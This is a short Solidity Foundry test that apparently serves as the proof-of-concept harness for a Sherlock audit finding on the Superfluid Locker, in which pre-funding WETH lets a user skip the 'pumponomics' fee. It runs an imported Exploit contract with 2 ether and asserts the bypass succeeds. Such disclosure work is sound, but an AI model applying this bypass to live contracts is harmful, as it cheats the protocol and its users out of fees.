// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58282-h-2-pumponomics-can-be-skipped-when-using-fluidlockerprovide.sol";

/* Superfluid Locker H-2 — pre-fund WETH skips pumponomics (Sherlock 2025-06) */
contract PoC_58282 is Test {
    function test_skipPumponomics() public {
        Exploit e = new Exploit();
        e.run{value: 2 ether}();

        assertEq(e.ethPumpedSeen(), 1, "only 1 wei pumped (1% of 100 dust)");
        assertGt(e.wethInPosition(), e.PRELOAD_ETH() * 99 / 100, "full preload in position");
        assertEq(e.locker().activePositionCount(), 1, "position opened");
    }
}
